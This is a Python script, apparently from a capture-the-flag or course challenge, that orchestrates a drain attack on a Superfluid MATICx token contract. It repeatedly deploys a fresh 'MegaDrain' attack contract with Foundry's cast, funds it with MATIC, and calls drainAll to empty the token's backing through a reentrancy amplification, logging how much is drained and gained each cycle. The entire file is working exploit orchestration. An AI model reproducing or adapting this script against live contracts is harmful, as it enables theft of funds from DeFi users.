#!/usr/bin/env python3
"""
CH6 MegaDrain approach — deploy MegaDrainMATICx contract per cycle.
Each contract is a fresh publisher, avoiding deposit accumulation.
"""
import subprocess, json, os, time, sys

from dotenv import load_dotenv
load_dotenv("/Users/dldustn/Desktop/AssignmentC/.env")

RPC = os.environ["RPC_CH6_SUPERFLUID_V21"]
PK = os.environ["PRIVATE_KEY"]
ATK = os.environ["PUBLIC_ADDRESS"]

MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
GAS_LIMIT = "29000000"

def get_balance(addr):
    cmd = ["cast", "balance", addr, "--rpc-url", RPC]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return int(r.stdout.strip())

def cast_send_create(bytecode, gas_limit=None):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", bytecode, "--json"]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    if r.returncode != 0:
        print(f"  DEPLOY ERROR: {r.stderr.strip()[:300]}", flush=True)
        return None
    try:
        return json.loads(r.stdout)["contractAddress"]
    except:
        return None

def cast_send(to, sig, args=None, value=None, gas_limit=None):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--json"]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    if value:
        cmd += ["--value", str(value)]
    cmd += [to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    if r.returncode != 0:
        print(f"  TX ERROR: {r.stderr.strip()[:300]}", flush=True)
        return False
    return True

def deploy_mega_drain():
    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/MegaDrainMATICx.json"
    with open(artifact) as f:
        bytecode = json.load(f)["bytecode"]["object"]
    return cast_send_create(bytecode)

def main():
    print("=== CH6 MegaDrain MATICx ===", flush=True)

    for cycle in range(20):
        bal = get_balance(ATK)
        backing = get_balance(MATICX)
        print(f"\nCycle {cycle}: bal={bal}, backing={backing}", flush=True)

        if backing == 0:
            print("FULLY DRAINED!", flush=True)
            break

        if bal < 10**18:  # less than 1 MATIC
            print("Not enough MATIC for gas + seed", flush=True)
            break

        # Deploy fresh MegaDrain contract
        print("  Deploying MegaDrainMATICx...", flush=True)
        mega = deploy_mega_drain()
        if not mega:
            print("  Deploy failed, retrying...", flush=True)
            time.sleep(5)
            continue
        print(f"  MegaDrain: {mega}", flush=True)

        # Calculate how much to send
        # Keep 1 MATIC for gas on the EOA
        send_amount = bal - 10**18
        # But don't send more than we need: backing / 10 is enough (reentry=100, so 10x amplification minimum)
        max_needed = backing // 5  # generous: backing/5
        if send_amount > max_needed:
            send_amount = max_needed

        # Don't send more than ~50K MATIC to avoid overflow
        MAX_SEND = 50000 * 10**18
        if send_amount > MAX_SEND:
            send_amount = MAX_SEND

        if send_amount <= 0:
            print("  Nothing to send", flush=True)
            break

        print(f"  Sending {send_amount} wei to MegaDrain...", flush=True)

        # Use a unique idx base for each cycle
        idx_base = 900000000 + cycle * 200

        # Call drainAll with the MATIC
        if not cast_send(mega, "drainAll(uint32)", [idx_base], value=send_amount, gas_limit=GAS_LIMIT):
            print(f"  DrainAll failed!", flush=True)
            continue

        new_bal = get_balance(ATK)
        new_backing = get_balance(MATICX)
        drained = backing - new_backing
        gained = new_bal - bal
        print(f"  Drained: {drained}, gained: {gained}", flush=True)
        print(f"  New backing: {new_backing}, new bal: {new_bal}", flush=True)

    print(f"\n=== FINAL ===", flush=True)
    print(f"MATICx backing: {get_balance(MATICX)}", flush=True)
    print(f"Our balance: {get_balance(ATK)}", flush=True)

if __name__ == "__main__":
    main()
